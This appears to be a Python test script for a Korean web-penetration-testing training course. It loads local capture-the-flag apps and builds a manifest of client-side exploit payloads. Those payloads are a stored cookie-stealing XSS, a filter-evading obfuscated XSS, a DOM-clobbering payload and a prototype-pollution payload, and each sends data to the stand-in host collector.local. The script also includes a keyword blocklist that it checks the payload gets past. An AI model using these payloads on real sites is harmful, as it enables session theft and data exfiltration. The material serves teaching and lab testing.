# -*- coding: utf-8 -*-
import os, sys, json, importlib.util, urllib.parse
REPO = "/sessions/quirky-dazzling-planck/mnt/2026.06 교육센터 특강(금융기관 담당자)/web-pentest-edu"
sys.path.insert(0, os.path.join(REPO, "_base"))
os.environ.update({"FLAG_XSS_1":"flag{xss1_REAL}","FLAG_XSS_3":"flag{xss3_REAL}","ADMIN_PASSWORD":"adminpw"})
def load(p,n):
    s=importlib.util.spec_from_file_location(n, os.path.join(REPO,p)); m=importlib.util.module_from_spec(s); s.loader.exec_module(m); return m.app
manifest=[]

# xss-1
a=load("challenges/client/xss-1/app.py","x1"); c=a.test_client()
c.post("/register",data={"userid":"u","userpw":"p"}); c.post("/login",data={"userid":"u","userpw":"p"})
pl1='<script>new Image().src="http://collector.local/?c="+encodeURIComponent(document.cookie)</script>'
c.post("/write",data={"subject":"s","content":pl1})
open("/tmp/xss1.html","w").write(c.get("/board/0").get_data(as_text=True))
manifest.append({"name":"xss-1","file":"/tmp/xss1.html","cookie":"flag=flag{xss1_REAL}","flag":"flag{xss1_REAL}","url":"http://victim.local/board/0"})

# xss-3
b=load("challenges/client/xss-3/app.py","x3"); cb=b.test_client()
cb.post("/register",data={"userid":"u","userpw":"p"}); cb.post("/login",data={"userid":"u","userpw":"p"})
body=r"f\x65tch\x28\x27/board/0\x27\x29.then\x28e=>e.text\x28\x29\x29.then\x28e=>{f\x65tch\x28\x27http://collector.local/?c=\x27+encodeURIComp\x6fnent\x28e\x29\x29}\x29"
pl3="<script>Set[`co`+`nst`+`ructor`]`"+body+"```</script>"
vulns=["javascript","frame","object","on","data","base","\\u","alert","fetch","xmlhttprequest","eval","constructor"]+list("()'\"")
print("xss-3 payload 필터통과:", not any(v in pl3.lower() for v in vulns))
r=cb.post("/write",data={"subject":"s","content":pl3}, follow_redirects=False); print("xss-3 저장(302=ok):", r.status_code)
open("/tmp/xss3.html","w").write(cb.get("/board/1").get_data(as_text=True))
manifest.append({"name":"xss-3","file":"/tmp/xss3.html","cookie":"","flag":"flag{xss3_REAL}","url":"http://victim.local/board/1"})

# domclob
open("/tmp/domclob.html","w").write('''<html><head><script>
window.onload = ()=>{ if(!window.CLOB){ CLOB={isAdmin:false}; } if(CLOB.isAdmin){ var params=new URLSearchParams(location.search); eval(params.get("c")); } };
</script></head><body><form id=CLOB><input id=isAdmin></form><div id='flag'>flag{domclob_REAL}</div></body></html>''')
c_dom="_=String.fromCharCode(0x2f);fetch(/http:/.source+_+_+/collector.local?a=/.source+flag.innerText)"
manifest.append({"name":"domclob","file":"/tmp/domclob.html","cookie":"","flag":"flag{domclob_REAL}","url":"http://victim.local/?c="+urllib.parse.quote(c_dom)})

# proto
open("/tmp/proto.html","w").write('''<html><head><script>
function isObject(o){return o!==null&&typeof o==='object';}
function merge(a,b){for(let k in b){if(isObject(a[k])&&isObject(b[k]))merge(a[k],b[k]);else a[k]=b[k];}return a;}
CLOB={name:'arang'};
window.onload=()=>{ var params=new URLSearchParams(location.search); try{var c=JSON.parse(params.get("c"));merge(CLOB,c);}catch(e){} if(CLOB.isAdmin){ eval(CLOB.code);} };
</script></head><body><div id='flag'>flag{proto_REAL}</div></body></html>''')
_code="fetch('http://collector.local?a='+flag.innerText)"
c_proto=json.dumps({"__proto__":{"isAdmin":True,"code":_code}})
manifest.append({"name":"proto","file":"/tmp/proto.html","cookie":"","flag":"flag{proto_REAL}","url":"http://victim.local/?c="+urllib.parse.quote(c_proto)})

json.dump(manifest, open("/tmp/client_tests.json","w"))
print("manifest:", len(manifest))
